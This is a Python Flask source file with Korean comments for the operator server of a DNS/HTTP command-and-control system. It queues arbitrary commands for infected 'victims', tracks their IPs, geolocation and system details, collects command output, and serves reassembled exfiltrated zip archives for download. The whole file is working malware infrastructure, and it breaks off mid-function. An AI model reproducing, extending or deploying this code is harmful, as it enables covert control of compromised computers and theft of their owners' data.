# /root/dns-c2/server/flask_api_v7.py (기존 flask.api_v6.py에서 수정됨)

import json
import os
import uuid
import shutil
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory # render_template 추가
import logging
import hashlib
import base64 # view_command_result_page, browse_folder_item 에서 사용되므로 추가
import glob
import requests

app = Flask(__name__)

# Configuration
BASE_DIR = "/root/dns-c2/"
COMMAND_QUEUE_FILE = os.path.join(BASE_DIR, "server", "command_queue.json")
VICTIM_METADATA_FILE = os.path.join(BASE_DIR, "server", "victim_metadata.json") # 추가
RESULTS_DIR = os.path.join(BASE_DIR, "logs", "results")
API_PORT = 5000
ONLINE_THRESHOLD_SECONDS = 300
RESTORED_ZIPS_DIR = os.path.abspath(os.path.join(BASE_DIR, "analyzer", "restored_zips"))



logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Command Queue Functions (기존과 거의 동일, 에러 로깅 강화) ---
def load_command_queue():
    if not os.path.exists(COMMAND_QUEUE_FILE):
        logging.info(f"Command queue file {COMMAND_QUEUE_FILE} not found. Returning empty list.")
        return []
    try:
        with open(COMMAND_QUEUE_FILE, 'r') as f:
            data = json.load(f)
            if not isinstance(data, list):
                logging.error(f"Command queue file {COMMAND_QUEUE_FILE} does not contain a JSON list. Content: {str(data)[:200]}. Resetting.")
                save_command_queue([]) 
                return []
            for item in data:
                if not isinstance(item, dict):
                    logging.error(f"Command queue item is not a dict: {str(item)[:100]}. Resetting queue.")
                    save_command_queue([])
                    return []
            return data
    except (IOError, json.JSONDecodeError) as e:
        logging.error(f"Error loading or parsing command queue {COMMAND_QUEUE_FILE}: {e}. Returning empty list.")
        return []
    except Exception as e_global:
        logging.error(f"Unexpected error loading command queue {COMMAND_QUEUE_FILE}: {e_global}. Returning empty list.")
        return []

def save_command_queue(queue):
    try:
        os.makedirs(os.path.dirname(COMMAND_QUEUE_FILE), exist_ok=True)
        with open(COMMAND_QUEUE_FILE, 'w') as f:
            json.dump(queue, f, indent=2)
    except IOError as e:
        logging.error(f"Error saving command queue {COMMAND_QUEUE_FILE}: {e}")
    except Exception as e_global:
        logging.error(f"Unexpected error saving command queue {COMMAND_QUEUE_FILE}: {e_global}")

# --- Victim Metadata Functions (새로 추가) ---
def load_victim_metadata():
    if not os.path.exists(VICTIM_METADATA_FILE):
        logging.info(f"Victim metadata file {VICTIM_METADATA_FILE} not found. Returning empty dict.")
        return {}
    try:
        with open(VICTIM_METADATA_FILE, 'r') as f:
            data = json.load(f)
            if not isinstance(data, dict):
                logging.error(f"Victim metadata file {VICTIM_METADATA_FILE} does not contain a JSON dict. Content: {str(data)[:200]}. Resetting.")
                save_victim_metadata({})
                return {}
            return data
    except (IOError, json.JSONDecodeError) as e:
        logging.error(f"Error loading or parsing victim metadata {VICTIM_METADATA_FILE}: {e}. Returning empty dict.")
        return {}
    except Exception as e_global:
        logging.error(f"Unexpected error loading victim metadata {VICTIM_METADATA_FILE}: {e_global}. Returning empty dict.")
        return {}

def save_victim_metadata(metadata):
    try:
        os.makedirs(os.path.dirname(VICTIM_METADATA_FILE), exist_ok=True)
        with open(VICTIM_METADATA_FILE, 'w') as f:
            json.dump(metadata, f, indent=2)
    except IOError as e:
        logging.error(f"Error saving victim metadata {VICTIM_METADATA_FILE}: {e}")
    except Exception as e_global:
        logging.error(f"Unexpected error saving victim metadata {VICTIM_METADATA_FILE}: {e_global}")

def update_victim_last_seen(victim_hash, client_data=None):
    if not victim_hash:
        logging.warning("Attempted to update last seen for an empty victim_hash.")
        return
    metadata = load_victim_metadata()
    now_utc_iso = datetime.now(timezone.utc).isoformat(timespec='seconds')
    formatted_now = now_utc_iso.replace('T', ' ')[:19] # "YYYY-MM-DD HH:MM:SS"

    if victim_hash not in metadata:
        metadata[victim_hash] = {}
        metadata[victim_hash]['first_seen'] = formatted_now
        metadata[victim_hash]['system_info'] = {} 
        logging.info(f"Victim {victim_hash} first seen at {formatted_now}.")
    
    # 1. 마지막 접속 시간 갱신
    metadata[victim_hash]['last_seen'] = formatted_now
    
    # 2. 공개 IP 주소 및 위치 정보 추가
    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # 이전에 저장된 IP와 다를 경우에만 GeoIP API를 호출 (API 요청 최소화)
    if metadata.get(victim_hash, {}).get('system_info', {}).get('public_ip') != public_ip:
        if 'system_info' not in metadata[victim_hash]:
            metadata[victim_hash]['system_info'] = {}
        metadata[victim_hash]['system_info']['public_ip'] = public_ip
        try:
            # 무료 GeoIP API 사용
            response = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=2)
            if response.status_code == 200:
                geo_data = response.json()
                if geo_data.get('status') == 'success':
                    location_info = {
                        'country': geo_data.get('country'),
                        'city': geo_data.get('city'),
                        'isp': geo_data.get('isp')
                    }
                    metadata[victim_hash]['system_info']['geolocation'] = location_info
                    logging.info(f"Got GeoIP for {public_ip}: {location_info}")
        except Exception as e_geo:
            logging.warning(f"Failed to get GeoIP for {public_ip}: {e_geo}")

    # 3. 클라이언트가 보낸 추가 정보 (system_info, security_info 등) 저장
    if client_data and isinstance(client_data, dict):
        if 'system_info' in client_data and isinstance(client_data['system_info'], dict):
            if not isinstance(metadata[victim_hash].get('system_info'), dict):
                 metadata[victim_hash]['system_info'] = {}
            metadata[victim_hash]['system_info'].update(client_data['system_info'])
            logging.info(f"Updated system_info for victim_hash {victim_hash}.")
    
    # 4. 변경된 모든 내용을 파일에 최종 저장
    save_victim_metadata(metadata)
    logging.debug(f"Updated metadata for victim_hash {victim_hash}.")


# --- Helper ---
def get_victim_hashed_id(victim_uuid):
    if not victim_uuid: return None
    return hashlib.sha1(victim_uuid.encode()).hexdigest()[:6]

# --- Routes ---
@app.route('/', methods=['GET'])
def index():
    logging.info("--- index route CALLED ---") # 함수 시작 로깅
    victims_data = []
    try:
        victim_metadata = load_victim_metadata()
        logging.debug("index: Victim metadata loaded.")

        victim_hashes_from_dir = set()
        if os.path.exists(RESULTS_DIR) and os.path.isdir(RESULTS_DIR):
            try:
                victim_hashes_from_dir.update(d for d in os.listdir(RESULTS_DIR) if os.path.isdir(os.path.join(RESULTS_DIR, d)))
                logging.debug(f"index: Victim hashes from dir: {victim_hashes_from_dir}")
            except OSError as e:
                logging.error(f"index: Error listing victim directories in {RESULTS_DIR}: {e}")
        else:
            logging.warning(f"index: RESULTS_DIR {RESULTS_DIR} does not exist or is not a directory.")

        all_known_victim_hashes = victim_hashes_from_dir | set(victim_metadata.keys())
        logging.info(f"index: All known victim hashes: {all_known_victim_hashes}")

        for v_hash in sorted(list(all_known_victim_hashes)):
            victim_meta = victim_metadata.get(v_hash, {})
            last_seen_str = victim_meta.get('last_seen', None)
            status = "Unknown"

            if last_seen_str and last_seen_str != 'Never':
                try:
                    last_seen_dt = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S').replace(tzinfo=timezone.utc)
                    if (datetime.now(timezone.utc) - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS:
                        status = "Online"
                    else:
                        status = "Offline"
                except ValueError:
                    logging.warning(f"index: Could not parse last_seen string '{last_seen_str}' for victim {v_hash}. Setting status to Unknown.")
            elif last_seen_str == 'Never':
                status = "Offline"
            
            victim_info = {
                "id": v_hash,
                "display_name": f"Victim-{v_hash}",
                "status": status,
                "system_info": victim_meta.get('system_info', {}),
                "last_seen": last_seen_str if last_seen_str else 'Never',
                "first_seen": victim_meta.get('first_seen', 'Unknown')
            }
            victims_data.append(victim_info)
        
        logging.debug(f"index: Prepared victims_data: {victims_data}")
        queued_commands = load_command_queue()
        logging.debug(f"index: Loaded queued_commands: {len(queued_commands)} commands.")

        # 이 부분이 중요합니다. 이 로그가 출력되는지 확인하세요.
        logging.info(f"index: About to render index.html with {len(victims_data)} victims.")
        response = render_template('index.html', victims=victims_data, queued_commands=queued_commands, RESULTS_DIR_DISPLAY=RESULTS_DIR)
        logging.info("--- index route RETURNING response ---") # 반환 직전 로깅
        return response # 이 return 문이 반드시 실행되어야 합니다.

    except Exception as e:
        # index 함수 내에서 예상치 못한 다른 예외가 발생했는지 확인
        logging.error(f"CRITICAL ERROR within index route: {e}", exc_info=True)
        # 비상 반환 (실제로는 Flask의 500 오류 페이지가 더 적절하지만, None 반환을 막기 위함)
        return "An unexpected error occurred in the index route. Please check server logs.", 500


@app.route('/download/exfil/<victim_hash>/<session_name>')
def download_restored_exfil_file(victim_hash, session_name):
    """rebuild_zip.py가 생성한 파일을 다운로드합니다."""
    if not victim_hash or not session_name:
        return "Invalid request: victim_hash or session_name is missing.", 400

    # rebuild_zip.py가 생성하는 예상 파일명
    filename = f"victim_{victim_hash}_{session_name}_restored.zip" 
    
    logging.info(f"Attempting to serve restored file: {filename} from directory: {RESTORED_ZIPS_DIR}")

    if not os.path.isdir(RESTORED_ZIPS_DIR):
        logging.error(f"Restored zips directory does not exist: {RESTORED_ZIPS_DIR}")
        return render_template('error.html', message=f"Restored files directory not found on server. Please check configuration."), 500

    try:
        # send_from_directory를 사용하여 안전하게 파일 다운로드 제공
        return send_from_directory(
            RESTORED_ZIPS_DIR,
            filename,
            as_attachment=True
        )
    except FileNotFoundError:
        logging.error(f"Restored file not found: {os.path.join(RESTORED_ZIPS_DIR, filename)}")
        return render_template('error.html', message=f"Reassembled file '{filename}' not found. Please run the rebuild_zip.py script for this session first."), 404
    except Exception as e:
        logging.error(f"Error serving restored file '{filename}': {e}", exc_info=True)
        return render_template('error.html', message=f"An error occurred while serving the file: {e}"), 500

@app.route('/queue_command', methods=['POST'])
def queue_command_route():
    victim_id_form = request.form.get('victim_id', '').strip() # API는 victim_hash를 사용하지만, 폼에서는 victim_id로 받음
    command_string = request.form.get('command_string', '').strip()

    if not victim_id_form or not command_string:
        logging.error("Queue command: Missing victim_id or command_string in form submission.")
        return "Missing victim_id or command_string", 400
    
    queue = load_command_queue()
    new_command = {
        "command_id": str(uuid.uuid4()), 
        "victim_hash": victim_id_form, # 웹 UI에서는 victim_hash를 직접 입력받거나 'all'
        "command_string": command_string,
        "status": "pending", 
        "submitted_at": datetime.now(timezone.utc).isoformat(timespec='seconds'),
        "delivered_at_dns": None, 
        "delivered_at_http": None, 
        "result_path": None 
    }
    queue.append(new_command)
    save_command_queue(queue)
    logging.info(f"Queued command ID {new_command['command_id']} for victim_hash '{victim_id_form}': {command_string}")
    return redirect(url_for('index'))

@app.route('/victim/<victim_hash>', methods=['GET'])
def view_victim_details(victim_hash):
    victim_path_full = os.path.join(RESULTS_DIR, victim_hash)
    sessions_info = []
    if os.path.isdir(victim_path_full):
        try:
            session_dirs = [d for d in os.listdir(victim_path_full) if os.path.isdir(os.path.join(victim_path_full, d))]
            for sess_name in sorted(session_dirs, reverse=True):
                session_path_abs = os.path.join(victim_path_full, sess_name)
                
                # 수정: 'exfil_data' 폴더 대신 'chunk*.b64' 파일 존재 여부 확인
                exfil_chunks_exist = len(glob.glob(os.path.join(session_path_abs, "chunk*.b64"))) > 0
                
                session_item = {
                    "name": sess_name,
                    "has_exfil": exfil_chunks_exist, # 수정된 플래그 사용
                    "has_dns_cmd": os.path.isdir(os.path.join(session_path_abs, "cmd_results")),
                    "has_http_cmd": os.path.isdir(os.path.join(session_path_abs, "http_cmd_results"))
                }
                sessions_info.append(session_item)
        except OSError as e:
            # ... (기존 에러 처리) ...
            return render_template('error.html', message=f"Error reading data for victim {victim_hash}"), 500
    
    # ... (나머지 부분은 동일) ...
    metadata = load_victim_metadata().get(victim_hash, {})
    first_seen = metadata.get('first_seen', 'Unknown')
    last_seen = metadata.get('last_seen', 'Unknown')
    system_info_for_template = metadata.get('system_info', {})

    return render_template('victim_details.html', 
                           victim_hash=victim_hash, 
                           sessions_info=sessions_info,
                           first_seen=first_seen,
                           last_seen=last_seen,
                           system_info=system_info_for_template)

@app.route('/browse/<victim_hash>/<session_name>/<path:sub_folder>') # sub_folder가 여러 depth를 가질 수 있도록 path 타입 사용
def browse_folder(victim_hash, session_name, sub_folder):
    # sub_folder 경로 조작 방지 강화
    base_victim_session_path = os.path.normpath(os.path.join(RESULTS_DIR, victim_hash, session_name))
    target_path = os.path.normpath(os.path.join(base_victim_session_path, sub_folder))

    if not target_path.startswith(base_victim_session_path) or not target_path.startswith(os.path.normpath(RESULTS_DIR)):
        logging.warning(f"Path traversal attempt detected or invalid base path for browse: {target_path}")
        return render_template('error.html', message="Access denied or invalid path."), 403
    
    if not os.path.isdir(target_path):
        logging.info(f"Browse folder not found: {target_path}")
        return render_template('error.html', message=f"Folder not found: {sub_folder}"), 404

    items = []
    try:
        for item_name in sorted(os.listdir(target_path)):
            item_path = os.path.join(target_path, item_name)
            is_dir = os.path.isdir(item_path)
            # 링크 생성 시 sub_folder가 올바르게 누적되도록 os.path.join 사용
            current_browse_path = os.path.join(sub_folder, item_name).replace("\\", "/") # 윈도우 경로 구분자 처리
            if is_dir:
                link = url_for('browse_folder', victim_hash=victim_hash, session_name=session_name, sub_folder=current_browse_path)
            else: # is file
                link = url_for('browse_folder_item', victim_hash=victim_hash, session_name=session_name, sub_folder=sub_folder, item_name=item_name)
            items.append({"name": item_name, "is_dir": is_dir, "link": link, "size": os.path.getsize(item_path) if not is_dir else None})
    except OSError as e:
        logging.error(f"Error reading folder {target_path}: {e}")
        return render_template('error.html', message=f"Error reading folder: {e}"), 500
    
    # 상위 폴더로 이동하기 위한 링크 생성
    parent_folder_link = None
    if sub_folder and sub_folder != ".": # 현재 sub_folder가 루트가 아닌 경우
        parent_sub_folder = os.path.dirname(sub_folder).replace("\\", "/")
        if parent_sub_folder == "": parent_sub_folder = "." # 최상위 폴더는 session_name으로 가도록
        if sub_folder == ".": # RESULTS_DIR/victim_hash/session_name 인 경우
             parent_folder_link = url_for('view_victim_details', victim_hash=victim_hash)
        else:
             parent_folder_link = url_for('browse_folder', victim_hash=victim_hash, session_name=session_name, sub_folder=parent_sub_folder if parent_sub_folder != "." else "")


    return render_template('browse_folder.html', 
                           victim_hash=victim_hash, 
                           session_name=session_name, 
                           sub_folder=sub_folder, 
                           items=items,
                           parent_folder_link=parent_folder_link)


@app.route('/browse/<victim_hash>/<session_name>/<path:sub_folder>/<item_name>') # item_name도 path로 변경하지 않음. 파일 이름이니까.
def browse_folder_item(victim_hash, session_name, sub_folder, item_name):
    base_victim_session_path = os.path.normpath(os.path.join(RESULTS_DIR, victim_hash, session_name))
    file_path = os.path.normpath(os.path.join(base_victim_session_path, sub_folder, item_name))

    if not file_path.startswith(base_victim_session_path) or not file_path.startswith(os.path.normpath(RESULTS_DIR)):
        logging.warning(f"Path traversal attempt detected for file view: {file_path}")
        return render_template('error.html', message="Access denied or invalid path for file."), 403
    
    if not os.path.isfile(file_path):
        logging.info(f"File not found for viewing: {file_path}")
        return render_template('error.html', message="File not found."), 404
    
    content_to_display = ""
    try:
        with open(file_path, 'rb') as f: 
            content_bytes = f.read()
        
        # 파일 확장자 또는 내용에 따른 처리 (기존 로직 유지)
        is_binary = False
        try:
            content_str = content_bytes.decode('utf-8', 'replace')
            if file_path.endswith(".b64"): 
                try:
                    b32_content = content_str.strip()
                    # B32 디코딩 전에 패딩 추가 (길이가 8의 배수가 아니면 에러 발생 가능)
                    padded_b32_content = b32_content + '=' * (-len(b32_content) % 8)
                    decoded_bytes = base64.b32decode(padded_b32_content.upper()) 
                    content_to_display = f"<h3>Decoded B32 Content from Chunk:</h3><pre>{decoded_bytes.decode('utf-8', 'replace')}</pre><hr/><h3>Raw B32 Chunk Content:</h3><pre>{content_str}</pre>"
                except Exception as decode_err:
                    content_to_display = f"Error decoding B32 content: {decode_err}<br/>Raw B32 Chunk Content:<pre>{content_str}</pre>"
                    is_binary = True # 디코딩 실패 시 바이너리로 간주
            elif file_path.endswith(".txt") and ("http_cmd_results" in file_path or "cmd_results" in file_path) :
                 content_to_display = f"<pre>{content_str}</pre>"
            else: # Other text files, or try to decode as text
                 content_to_display = f"<pre>{content_str}</pre>" # 기본적으로 텍스트로 시도
                 # 간단한 바이너리 탐지 (예: NULL 바이트 다수 포함)
                 if b'\x00' in content_bytes[:1024] and content_bytes.count(b'\x00') / len(content_bytes[:1024]) > 0.1: # 처음 1KB에서 NULL 바이트가 10% 이상이면
                     is_binary = True
                     
        except UnicodeDecodeError: 
            is_binary = True

        if is_binary: # 바이너리 파일 처리
            import binascii
            hex_output = []
            for i in range(0, len(content_bytes), 16):
                chunk = content_bytes[i:i+16]
                hex_part = ' '.join(f'{b:02x}' for b in chunk)
                ascii_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
                hex_output.append(f"{i:08x}  {hex_part:<48}  |{ascii_part}|")
            
            # 이 라인을 for 루프 밖으로 이동
            hex_dump_str = '\n'.join(hex_output)
            content_to_display = f"<h3>Hexdump of Binary File:</h3><pre>{hex_dump_str}</pre>"

    except Exception as e:
        logging.error(f"Error reading file {file_path}: {e}")
        return render_template('error.html', message=f"Error reading file: {e}"), 500

    return render_template('browse_folder_item.html', 
                           item_name=item_name, 
                           content_to_display=content_to_display,
                           victim_hash=victim_hash,
                           session_name=session_name,
                           sub_folder=sub_folder)


@app.route('/command_result/<victim_hash>/<command_id>', methods=['GET'])
def view_command_result_page(victim_hash, command_id):
    queue = load_command_queue()
    target_command = next((cmd for cmd in queue if cmd.get('command_id') == command_id and cmd.get('victim_hash') == victim_hash), None)
    
    result_content = "Result not found or not yet submitted/processed for this specific victim and command ID."
    cmd_id_short_expected = hashlib.md5(command_id.encode()).hexdigest()[:6] if command_id else None
    victim_base_path = os.path.join(RESULTS_DIR, victim_hash)

    # DNS 제출 결과 확인
    if os.path.isdir(victim_base_path) and cmd_id_short_expected:
        for session_folder in os.listdir(victim_base_path): 
            session_path = os.path.join(victim_base_path, session_folder)
            if os.path.isdir(session_path):
                potential_cmd_result_dir = os.path.join(session_path, "cmd_results", cmd_id_short_expected)
                if os.path.isdir(potential_cmd_result_dir):
                    try:
                        chunk_files = sorted([f for f in os.listdir(potential_cmd_result_dir) if f.startswith("res_chunk") and f.endswith(".b64")])
                        raw_b32_data_list = []
                        for fname in chunk_files:
                            with open(os.path.join(potential_cmd_result_dir, fname), 'r') as chunk_f:
                                raw_b32_data_list.append(chunk_f.read().strip())
                        raw_b32_data = "".join(raw_b32_data_list)
                        
                        if raw_b32_data:
                            # B32 디코딩 전에 패딩 추가
                            padded_b32_data = raw_b32_data + '=' * (-len(raw_b32_data) % 8)
                            decoded_bytes = base64.b32decode(padded_b32_data.upper()) 
                            result_content = f"<h3>Result from DNS (Reassembled):</h3><pre>{decoded_bytes.decode('utf-8', 'ignore')}</pre>"
                        else: 
                            result_content = "DNS Result chunks found but were empty or could not be read."
                        break # 결과 찾았으면 루프 종료
                    except Exception as e_read: 
                        result_content = f"Error reading/processing DNS result chunks: {e_read}"
                        logging.error(f"Error reading/processing DNS result for cmd {command_id}, victim {victim_hash}: {e_read}")
    
    # HTTP 제출 결과 확인 (DNS 결과를 못 찾았거나 오류 시)
    if target_command and ("Result not found" in result_content or "Error" in result_content or "empty" in result_content):
        if target_command.get('result_path') and os.path.isfile(target_command['result_path']):
            try:
                with open(target_command['result_path'], 'r', encoding='utf-8') as f_http:
                    # 기존 결과에 추가하거나, HTTP 결과를 우선시 할 수 있음
                    http_res_text = f"<h3>Result from HTTP Submission:</h3><pre>{f_http.read()}</pre>"
                    if "Result not found" in result_content: # DNS 결과가 아예 없었으면 HTTP 결과만 표시
                        result_content = http_res_text
                    else: # DNS 결과 처리 중 오류가 있었으면, HTTP 결과도 같이 표시 (선택적)
                        result_content += f"<hr/>{http_res_text}"
            except Exception as e_http_read:
                 error_msg_http = f"<br/>Error reading stored HTTP result file: {e_http_read}"
                 if "Result not found" in result_content: result_content = error_msg_http
                 else: result_content += error_msg_http
                 logging.error(f"Error reading HTTP result for cmd {command_id}, victim {victim_hash}: {e_http_read}")
        elif target_command.get('status') == 'completed_http_result' and not target_command.get('result_path'):
            no_path_msg = "Result submitted via HTTP, but file path not recorded or file missing."
            if "Result not found" in result_content: result_content = no_path_msg
            else: result_content += f"<hr/>{no_path_msg}"


    return render_template('command_result.html', 
                           command_id=command_id, 
                           victim_hash=victim_hash,
                           target_command=target_command, 
                           result_content=result_content)


@app.route('/delete_command/<command_id>', methods=['POST'])
def delete_command(command_id): # 함수명과 인자를 라우트에 맞게 수정
    """ID에 해당하는 명령어를 큐에서 삭제합니다."""
    if not command_id:
        logging.warning("Attempt to delete command with empty command_id.")
        return redirect(url_for('index'))

    logging.info(f"Attempting to delete command: {command_id}")
    queue = load_command_queue()
    original_length = len(queue)
    
    new_queue = [cmd for cmd in queue if cmd.get('command_id') != command_id]
    
    if len(new_queue) < original_length:
        save_command_queue(new_queue)
        logging.info(f"Successfully deleted command(s) with ID {command_id} from queue.")
    else:
        logging.warning(f"Command ID {command_id} not found in queue for deletion.")
    return redirect(url_for('index'))

# --- 새로운 delete_victim 함수 추가 ---
@app.route('/delete_victim/<victim_hash>', methods=['POST'])
def delete_victim(victim_hash):
    """지정된 Victim의 모든 데이터(메타데이터, 결과 폴더, 관련 명령어)를 삭제합니다."""
    if not victim_hash:
        logging.warning("Attempt to delete victim with empty hash.")
        return redirect(url_for('index'))

    logging.info(f"Attempting to delete victim: {victim_hash}")

    # 1. victim_metadata.json 에서 정보 삭제
    victim_metadata = load_victim_metadata()
    if victim_hash in victim_metadata:
        del victim_metadata[victim_hash]
        save_victim_metadata(victim_metadata)
        logging.info(f"Removed victim {victim_hash} from victim_metadata.json")
    else:
        logging.warning(f"Victim {victim_hash} not found in victim_metadata.json")

    # 2. 결과 폴더 삭제
    victim_dir_path = os.path.join(RESULTS_DIR, victim_hash)
    if os.path.isdir(victim_dir_path):
        try:
            shutil.rmtree(victim_dir_path)
            logging.info(f"Successfully deleted directory: {victim_dir_path}")
        except OSError as e:
            logging.error(f"Error deleting directory {victim_dir_path}: {e}")
            return redirect(url_for('index'))
    else:
        logging.warning(f"Victim directory {victim_dir_path} not found for deletion.")

    # 3. 명령어 큐에서 해당 Victim 대상 명령어 삭제
    commands = load_command_queue()
    updated_commands = [cmd for cmd in commands if cmd.get('victim_hash') != victim_hash]
    if len(updated_commands) < len(commands):
        save_command_queue(updated_commands)
        logging.info(f"Removed commands targeting victim {victim_hash} from command_queue.json")

    logging.info(f"Victim {victim_hash} and associated data/commands processed for deletion.")
    return redirect(url_for('index'))

# /api/commands/ 엔드포인트 수정 (POST로 변경하고 추가 정보 처리)
@app.route('/api/commands/<victim_uuid_full>', methods=['POST']) # GET에서 POST로 변경
def get_commands_for_client(victim_uuid_full):
    victim_hash = get_victim_hashed_id(victim_uuid_full)
    if not victim_hash:
        return jsonify({"commands": []}), 400

    client_payload = request.get_json() # POST 요청의 JSON 바디 읽기
    session_id_client = client_payload.get('session_id') if client_payload else None
    system_info_from_client = client_payload.get('system_info') if client_payload else None
    
    logging.info(f"API: Client {victim_uuid_full} (hash: {victim_hash}, session: {session_id_client}) polling for commands.")

        # client_data를 전달하여 last_seen과 함께 시스템 정보 업데이트
    client_data_for_update = {}
    if system_info_from_client:
        client_data_for_update['system_info'] = system_info_from_client
    update_victim_last_seen(victim_hash, client_data_for_update)

    queue = load_command_queue()
    commands_to_send_to_client = []
    command_delivered_this_poll = False
    
    # API는 victim_hash를 사용
    for cmd_entry in queue: # Iterate over a validated list (load_command_queue에서 검증)
        if cmd_entry.get('status') == 'pending' and \
           (cmd_entry.get('victim_hash') == victim_hash or cmd_entry.get('victim_hash') == 'all'):
            cmd_id = cmd_entry.get('command_id')
            cmd_str = cmd_entry.get('command_string')
            
            if cmd_id and cmd_str: # 필수 필드 확인
                commands_to_send_to_client.append(f"{cmd_id}|{cmd_str}")
                cmd_entry['status'] = 'delivered_http' 
                cmd_entry['delivered_at_http'] = datetime.now(timezone.utc).isoformat(timespec='seconds')
                logging.info(f"API: Delivering command ID {cmd_id} ('{cmd_str[:50]}...') to victim {victim_hash} via HTTP.")
                command_delivered_this_poll = True
                # 한 번의 폴링에는 하나의 명령만 전달 (클라이언트 처리 단순화)
                break 
    
    if command_delivered_this_poll:
        save_command_queue(queue) 
        
    return jsonify({"commands": commands_to_send_to_client})

@app.route('/api/results/<victim_uuid_full>', methods=['POST'])
def submit_client_result(victim_uuid_full):
    victim_hash = get_victim_hashed_id(victim_uuid_full)
    if not victim_hash:
        logging.warning(f"API /results: Invalid or empty victim_uuid_full received: '{victim_uuid_full}'")
        return jsonify({"status": "error", "message": "Invalid victim_uuid_full"}), 400

    update_victim_last_seen(victim_hash) # 마지막 접속 시간 업데이트

    try:
        data = request.get_json()
        if not data: 
            logging.error(f"API Result: Empty JSON payload from {victim_uuid_full} (hash: {victim_hash})")
            return jsonify({"status": "error", "message": "Empty JSON payload"}), 400
        
        command_str_executed = data.get('command') # 클라이언트가 보낸 "ID|CMD" 형식
        result_output = data.get('result')

        if command_str_executed is None or result_output is None: # 필수 필드 확인
             logging.error(f"API Result: Missing 'command' or 'result' in payload from {victim_hash}.")
             return jsonify({"status": "error", "message": "Missing 'command' or 'result' in payload"}), 400

        command_id_from_client = None
        actual_command_str = command_str_executed # 기본값

        if "|" in command_str_executed:
            try: 
                command_id_from_client, actual_command_str = command_str_executed.split("|", 1)
            except ValueError: 
                # ID|CMD 형식이 아니면, command_str_executed 전체를 actual_command_str로 사용
                logging.warning(f"API Result: command string '{command_str_executed}' from {victim_hash} is not in ID|CMD format. Using full string for matching.")
                pass # command_id_from_client는 None으로 유지
        
    except Exception as e: # json 파싱 오류 등
        logging.error(f"API Result: Bad request or JSON error from {victim_uuid_full} (hash: {victim_hash}): {e}")
        return jsonify({"status": "error", "message": "Bad request or invalid JSON"}), 400

    logging.info(f"API: Received result from victim {victim_hash} for command '{actual_command_str[:100]}...' (Client provided ID: {command_id_from_client})")
    
    queue = load_command_queue()
    command_updated_in_queue = False

    for cmd_entry in queue:
        match_found = False
        # 1. Command ID로 매칭 (가장 정확)
        if command_id_from_client and cmd_entry.get('command_id') == command_id_from_client and \
           (cmd_entry.get('victim_hash') == victim_hash or cmd_entry.get('victim_hash') == 'all'):
            match_found = True
        # 2. Command ID가 없거나 매칭 안될 시, Command String으로 매칭 (폴백)
        #    주의: 동일 명령이 여러 번 'pending' 상태로 'all' 또는 특정 victim에게 할당된 경우, 가장 먼저 매칭되는 것을 업데이트.
        elif not command_id_from_client and cmd_entry.get('command_string') == actual_command_str and \
             (cmd_entry.get('victim_hash') == victim_hash or cmd_entry.get('victim_hash') == 'all') and \
             (cmd_entry.get('status') == 'delivered_http' or cmd_entry.get('status') == 'delivered_dns'): # 이미 실행된 명령의 결과일 가능성
            match_found = True
            logging.warning(f"API Result: Matched command by string for victim {victim_hash}. CMD: '{actual_command_str[:50]}...' This might be ambiguous if IDs are not used consistently.")
        
        if match_found:
            cmd_entry['status'] = 'completed_http_result'
            
            # 결과 저장 경로 결정 (세션 기반)
            # victim_uuid_full 대신 victim_hash 사용
            session_to_store = "default_http_session" # HTTP 결과는 별도 세션 디렉토리 사용 가능
            # 또는 가장 최근 세션 디렉토리를 찾아서 저장 (기존 로직과 유사하게)
            victim_sessions_path = os.path.join(RESULTS_DIR, victim_hash)
            if os.path.isdir(victim_sessions_path):
                sessions = sorted([s for s in os.listdir(victim_sessions_path) if os.path.isdir(os.path.join(victim_sessions_path, s))], reverse=True)
                if sessions: 
                    session_to_store = sessions[0] # 가장 최근 DNS 세션에 저장하거나,
                else: # 세션 디렉토리가 없으면 새로 생성
                    session_to_store = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_http')
            else: # victim 디렉토리도 없으면 새로 생성
                 session_to_store = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_http')


            result_file_dir_name = command_id_from_client if command_id_from_client else hashlib.md5(actual_command_str.encode()).hexdigest()[:10]
            result_file_base_dir = os.path.join(RESULTS_DIR, victim_hash, session_to_store, "http_cmd_results")
            # result_file_dir = os.path.join(result_file_base_dir, result_file_dir_name) # 하위 디렉토리 생성 안 함, 파일로 바로 저장
            os.makedirs(result_file_base_dir, exist_ok=True) # http_cmd_results 디렉토리 확인 및 생성
            
            result_file_path = os.path.join(result_file_base_dir, f"{result_file_dir_name}_result.txt") # 파일명에 _result.txt 추가

            try:
                with open(result_file_path, 'w', encoding='utf-8') as f:
                    f.write(f"Command ID (from client): {command_id_from_client}\n")
                    f.write(f"Command String (executed): {actual_command_str}\n")
                    f.write(f"Submitted at (UTC): {datetime.now(timezone.utc).isoformat(timespec='seconds')}\n\n")
                    f.write(result_output)
                cmd_entry['result_path'] = result_file_path 
                logging.info(f"API: Saved HTTP result for command ID {cmd_entry.get('command_id')} to {result_file_path}")
            except IOError as e_write: 
                logging.error(f"API: Error writing HTTP result file {result_file_path}: {e_write}")
                cmd_entry['result_path'] = None # 저장 실패 시 경로 없음
            
            command_updated_in_queue = True
            break # 첫 번째 매칭되는 명령만 업데이트
            
    if command_updated_in_queue:
        save_command_queue(queue)
    else:
        logging.warning(f"API: Received HTTP result for an unknown, already processed, or non-matching command from {victim_hash}: '{actual_command_str[:50]}...' (Client Provided ID: {command_id_from_client})")
        # 매칭되는 명령이 없더라도 결과는 저장할 수 있음 (선택적)
        # 예: unknown_results 폴더에 저장
        unknown_result_dir = os.path.join(RESULTS_DIR, victim_hash, "unknown_http_results")
        os.makedirs(unknown_result_dir, exist_ok=True)
        unknown_result_filename = f"{command_id_from_client or hashlib.md5(actual_command_str.encode()).hexdigest()[:10]}_{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}.txt"
        try:
            with open(os.path.join(unknown_result_dir, unknown_result_filename), 'w', encoding='utf-8') as f_unknown:
                f_unknown.write(f"Command (raw from client): {command_str_executed}\nResult:\n{result_output}")
